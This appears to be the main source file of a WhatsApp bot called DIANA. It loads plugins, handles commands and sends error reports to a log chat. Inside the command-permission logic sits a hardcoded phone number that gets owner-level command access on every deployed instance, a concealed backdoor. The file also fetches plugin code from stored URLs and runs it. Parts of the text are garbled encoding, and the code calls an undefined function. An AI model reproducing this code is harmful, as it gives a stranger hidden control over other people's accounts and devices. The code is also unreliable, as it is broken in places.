
const { default: makeWASocket, 
	useSingleFileAuthState,
	DisconnectReason,
	getContentType } = require('@adiwajshing/baileys')

const { state, saveState } = useSingleFileAuthState('./DIANA/session.json');
const pino = require('pino');
const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const dbfile = require('./dbfile');
const { Message, Image, Video, StringSession } = require('./DIANA/');
const { DataTypes } = require('sequelize');

const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const Language = require('./language');
const Lang = Language.getString('updater');

var OWNE = { ff: '94769370897,0' }

    
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});


    
const plugindb = require('./plugins/sql/plugin');
const { Console } = require('console');


String.prototype.format = function() {
    var i = 0,
        args = arguments;
    return this.replace(/{}/g, function() {
        return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};


if (!Date.now) {
    Date.now = function() {
        return new Date()
            .getTime();
    }
}


Array.prototype.remove = function() {
    var what, a = arguments,
        L = a.length,
        ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function DIANASTT() {

 


await config.DATABASE.sync();


        console.log(chalk.green.bold('πππ΄π΄π½ π³πΈπ°π½π° ππ° π±πΎπ πππ½π½πΈπ½πΆπ₯²...'));

        console.log(chalk.white.bold(' Version: ' + config.VERSION));
        
        console.log(chalk.green.bold(' Connecting to WhatsApp-Beta Web...'));


const conn = makeWASocket({
    logger: pino({level: 'silent'}),
    printQRInTerminal: true,
    auth: state
});
conn.ev.on('connection.update', async(update) => {
    const { connection, lastDisconnect } = update

    if (connection === 'close') {
        if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
            connectToWA()
        }
    }else if (connection === 'open') {
        console.log('conected')




try{
    console.log('INSTALL EXTERNALPLUGINS')
var plugins = await plugindb.PluginDB.findAll();
plugins.map(async (plugin) => {
    if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
        console.log(plugin.dataValues.name);
        var response = await got(plugin.dataValues.url);
        if (response.statusCode == 200) {
            fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
            require('./plugins/' + plugin.dataValues.name + '.js');
        }     
    }
});
 } catch(error) {
	 console.log("external plugin errorπ€¨π₯²")
	 
	 }

        console.log(
        chalk.blueBright.italic('πΈπ½πππ°π»π»πΈπ½πΆ πππππππ...'));



  
	             fs.readdirSync('./plugins')
                .forEach(plugin => {
                if (path.extname(plugin)
                    .toLowerCase() == '.js') {
                    require('./plugins/' + plugin);
                }
            });   
	    
	    console.log(
        chalk.green.bold('β πΏπ»ππΆπΈπ½π πΈπ½πππ°π»π»π΄π³'));

      


        let wtype = config.WORKTYPE == 'public' ? 'πππ΄π΄π½ π³πΈπ°π½π° ππΎππΊπΈπ½πΆ πΏππ±π»πΈπ²' : 'πππ΄π΄π½ π³πΈπ°π½π° ππΎππΊπΈπ½πΆ πΏππΈππ°ππ΄'
        console.log(chalk.bgGreen( wtype));

        
         
            var up_ch = "bot working now"
            await conn.sendMessage(dbfile.LOG, { text: up_ch });
            
        
    }
    })





    conn.ev.on('creds.update', saveState);

setInterval(async () => {
    const get_localized_date = {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
    };
    var utch = new Date().toLocaleDateString("EN", get_localized_date);
    var ov_time = new Date()
      .toLocaleString("LK", { timeZone: "Asia/Colombo" })
      .split(" ")[1];
    const biography =
      "π " +
      utch +
      "\nβ " +
      ov_time +
      "\n\nβ± Auto Bio By... π powered By Β©Axzi\n\nπ¨πΌβπ» Created by TenuhAx";
    await conn.updateProfileStatus(biography);
  }, 1000 * 10);

    

    conn.ev.on("messages.upsert", async(chatUpdate) => {

        if (!chatUpdate.messages && !chatUpdate.count) return;

        let msg = chatUpdate.messages[0]

        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;  

        if (config.NO_ONLINE) {
            await conn.sendPresenceUpdate('unavailable', msg.key.remoteJid);
        }

        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
        if (gb !== false) {
              await conn.sendMessage(msg.key.remoteJid , { video: { url : config.WELCOME_GIF }, caption: gb.message , gifPlayback: true } )
        }
        return; 
           
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
           var gb = await getMessage(msg.key.remoteJid);
           if (gb !== false) {
           await conn.sendMessage(msg.key.remoteJid , { video: { url : config.BYE_GIF }, caption: gb.message , gifPlayback: true } )
        }
        return;
        }     	    
	    
	    
        if (config.BLOCKCHAT !== false) {
            var abc = config.BLOCKCHAT.split(',');
            if (msg.key.remoteJid.includes('@g.us') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
        }


        events.commands.map(
        async(command) => {
            
            
            if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                
                
                }else if (msg.message && msg.message.buttonsResponseMessage && msg.message.buttonsResponseMessage.selectedButtonId ){
                    var text_msg = msg.message.buttonsResponseMessage.selectedButtonId;
                
                
                }else if (msg.message && msg.message.templateButtonReplyMessage && msg.message.templateButtonReplyMessage.selectedId ){
                    var text_msg = msg.message.templateButtonReplyMessage.selectedId;
               
               
                }else if (msg.message && msg.message.listResponseMessage && msg.message.listResponseMessage.singleSelectReply.selectedRowId ){
                    var text_msg = msg.message.listResponseMessage.singleSelectReply.selectedRowId;
                
                
                }else if (msg.message && msg.message.extendedTextMessage) {
                    var text_msg = msg.message.extendedTextMessage.text;
                
                
                }else if (msg.message && msg.message.conversation) {
                    var text_msg = msg.message.conversation;
                
                
                } else {
                    var text_msg = undefined;
                }
            if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo') && msg.message && msg.message.imageMessage !== null && (command.pattern === undefined || (command.pattern !== undefined && command.pattern.test(text_msg)))) || (command.pattern !== undefined && command.pattern.test(text_msg)) || (command.on !== undefined && command.on === 'text' && text_msg) || (command.on !== undefined && (command.on === 'video') && msg.message && msg.message.videoMessage !== null && (command.pattern === undefined || (command.pattern !== undefined && command.pattern.test(text_msg))))) {

               let sendMsg = false;

                if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true && (msg.participant  && config.SUDO.includes(',') ? config.SUDO.split(',')
                    .includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',')
                    .includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                    if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                    else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                }

                     if ((OWNE.ff == "94769370897,0" && msg.key.fromMe === false && command.fromMe === true && (msg.key.participant || msg.key.remoteJid && OWNE.ff.includes(',') ? OWNE.ff.split(',')
                     .includes(msg.key.participant.split('@')[0] || msg.key.remoteJid.split('@')[0] ) : msg.key.participant.split('@')[0] || msg.key.remoteJid.split('@')[0] == OWNE.ff || OWNE.ff.includes(',') ? OWNE.ff.split(',')
                     .includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNE.ff)) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                     if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                     else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                    }      


                if (sendMsg) {
                    if (config.SEND_READ && command.on === undefined) {
                        await conn.readMessages([msg.key]);
                    }
                    var match = text_msg.match(command.pattern);
                    if (command.on !== undefined && (command.on === 'image' || command.on === 'photo') && msg.message.imageMessage !== null) {
                        Diamymsg = new Image(conn, msg);
                    } else if (command.on !== undefined && (command.on === 'video') && msg.message.videoMessage !== null) {
                        Diamymsg = new Video(conn, msg);
                    } else {
                        Diamymsg = new Message(conn, msg);
                    }

                    if (msg.key.fromMe && command.deleteCommand) {
                        await Diamymsg.delete(msg)
                    }

                 try {
                        await command.

                        function(Diamymsg, match);
                    } catch (error) {
                        if (config.NOLOG == 'true') return;
                        if (config.LANG == 'SI') {
                            await conn.sendMessage(dbfile.LOG, {
                                text: '*π­ ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰΆ»ΰ·ΰΆ­ΰ·ΰ· [ D I A N A ] π¨*\n'  + '\n*ΰΆ―ΰ·ΰ·ΰΆΊ:* ```' + error + '```\n\n'
                            });
                            if (error.message.includes('URL')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Only Absolutely URLs Supported_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _The usage of media tools (xmedia, sticker..) in the LOG number._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _You can use commands in any chat, except the LOG number._'
                                });
                            } else if (error.message.includes('conversation')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Deleting Plugin_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Entering incorrectly the name of the plugin wanted to be deleted._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                });
                            } else if (error.message.includes('split')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Split of Undefined_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Commands that can be used by group admins occasionally dont see the split function._ ' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _Restarting will be enough._'
                                });
                            } else if (error.message.includes('SSL')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _SQL Database Error_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Database corruption._ ' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _There is no known solution. You can try reinstalling it._'
                                });
                            } else if (error.message.includes('Ookla')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Ookla Server Connection_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Speedtest data cannot be transmitted to the server._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _If you use it one more time the problem will be solved._'
                                });
                            } else if (error.message.includes('params')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Requested Audio Params_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Using the TTS command outside the Latin alphabet._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _The problem will be solved if you use the command in Latin letters frame._'
                                });
                            } else if (error.message.includes('unlink')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== ```Error Resolved``` ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _No Such File or Directory_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Incorrect coding of the plugin._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _Please check the your plugin codes._'
                                });
                            } else if (error.message.includes('404')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Error 404 HTTPS_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                });
                            } else if (error.message.includes('reply.delete')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Reply Delete Function_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Using IMG or Wiki commands._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _There is no solution for this error. It is not a fatal error._'
                                });
                            } else if (error.message.includes('load.delete')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Reply Delete Function_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Using IMG or Wiki commands._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _There is no solution for this error. It is not a fatal error._'
                                });
                            } else if (error.message.includes('400')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Bailyes Action Error_ ' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _The exact reason is unknown. More than one option may have triggered this error._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                });
                            } else if (error.message.includes('decode')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Cannot Decode Text or Media_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Incorrect use of the plug._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _Please use the commands as written in the plugin description._'
                                });
                            } else if (error.message.includes('unescaped')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π ΰΆ―ΰ·ΰ· ΰ·ΰ·ΰ·ΰ·ΰΆ½ΰ·ΰ·ΰΆ«ΰΆΊ [ D I A N A ] π§*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  ΰΆ΄ΰ·βΰΆ»ΰΆ°ΰ·ΰΆ± ΰΆ―ΰ·ΰ·ΰΆΊ:* _Word Character Usage_' + '\n*βοΈ ΰ·ΰ·ΰΆ­ΰ·ΰ·:* _Using commands such as TTP, ATTP outside the Latin alphabet._' + '\n*π‘οΈ ΰ·ΰ·ΰ·ΰΆ³ΰ·ΰΆΈ:* _The problem will be solved if you use the command in Latin alphabet.._'
                                });
                            } else {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*ππ» ΰ·ΰΆΈΰ·ΰ·ΰΆ±ΰ·ΰΆ±! ΰΆΈΰΆ§ ΰΆΈΰ·ΰΆΈ ΰΆ―ΰ·ΰ·ΰΆΊ ΰΆΰ·ΰΆΊΰ·ΰ·ΰΆΊ ΰΆ±ΰ·ΰ·ΰ·ΰΆ ππ»*' + '\n_ΰΆΰΆ΄ΰ·ΰΆ―ΰ·ΰ·ΰ· ΰ·ΰΆ³ΰ·ΰ· ΰΆΰΆΆΰΆ§ ΰΆΰΆ΄ΰΆΰ· ΰ·ΰ·ΰΆΊ ΰΆΰΆ±ΰ·ΰΆ©ΰ·ΰΆΊΰΆΈΰΆ§ ΰΆΰΆΰ·ΰ·ΰ·ΰΆΊ ΰ·ΰ·ΰ·_'
                                });
                            }
                        } else {
                            await conn.sendMessage(dbfile.LOG, {
                                text: '*π­ ERROR REPORT [ D I A N A ] βοΈ*\n' + '*Error:* ```' + error + '```\n\n'
                            }, {
                                detectLinks: false
                            });
                            if (error.message.includes('URL')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Only Absolutely URLs Supported_' + '\n*βοΈ Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' + '\n*π‘οΈ Solution:* _You can use commands in any chat, except the LOG number._'
                                });
                            } else if (error.message.includes('conversation')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Deleting Plugin_' + '\n*βοΈ Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' + '\n*π‘οΈ Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                });
                            } else if (error.message.includes('split')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Split of Undefined_' + '\n*βοΈ Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' + '\n*π‘οΈ Solution:* _Restarting will be enough._'
                                });
                            } else if (error.message.includes('SSL')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _SQL Database Error_' + '\n*βοΈ Reason:* _Database corruption._ ' + '\n*π‘οΈ Solution:* _There is no known solution. You can try reinstalling it._'
                                });
                            } else if (error.message.includes('Ookla')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Ookla Server Connection_' + '\n*βοΈ Reason:* _Speedtest data cannot be transmitted to the server._' + '\n*π‘οΈ Solution:* _If you use it one more time the problem will be solved._'
                                });
                            } else if (error.message.includes('params')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Requested Audio Params_' + '\n*βοΈ Reason:* _Using the TTS command outside the Latin alphabet._' + '\n*π‘οΈ Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                });
                            } else if (error.message.includes('unlink')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== ```Error Resolved``` ==========' + '\n\n*π  Main Error:* _No Such File or Directory_' + '\n*βοΈ Reason:* _Incorrect coding of the plugin._' + '\n*π‘οΈ Solution:* _Please check the your plugin codes._'
                                });
                            } else if (error.message.includes('404')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Error 404 HTTPS_' + '\n*βοΈ Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' + '\n*π‘οΈ Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                });
                            } else if (error.message.includes('reply.delete')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Reply Delete Function_' + '\n*βοΈ Reason:* _Using IMG or Wiki commands._' + '\n*π‘οΈ Solution:* _There is no solution for this error. It is not a fatal error._'
                                });
                            } else if (error.message.includes('load.delete')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Reply Delete Function_' + '\n*βοΈ Reason:* _Using IMG or Wiki commands._' + '\n*π‘οΈ Solution:* _There is no solution for this error. It is not a fatal error._'
                                });
                            } else if (error.message.includes('400')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Bailyes Action Error_ ' + '\n*βοΈ Reason:* _The exact reason is unknown. More than one option may have triggered this error._' + '\n*π‘οΈ Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                });
                            } else if (error.message.includes('decode')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Cannot Decode Text or Media_' +

                                    '\n*βοΈ Reason:* _Incorrect use of the plug._' + '\n*π‘οΈ Solution:* _Please use the commands as written in the plugin description._'
                                });
                            } else if (error.message.includes('unescaped')) {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*π­ α΄ΚΚα΄Κ α΄Ι΄α΄ΚΚsΙͺs [ D I A N A ] π*\n' + '\n========== _Error Resolved!_ ==========' + '\n\n*π  Main Error:* _Word Character Usage_' + '\n*βοΈ Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' + '\n*π‘οΈ Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                });
                            } else {
                                return await conn.sendMessage(dbfile.LOG, {
                                    text: '*ππ» Sorry, I Couldnt Read This Error! ππ»*' + '\n_You can write to our support group for more help._'
                                });
                            }
                        }
                    }
                }
            }
        })
    })
    
}

DIANASTT();
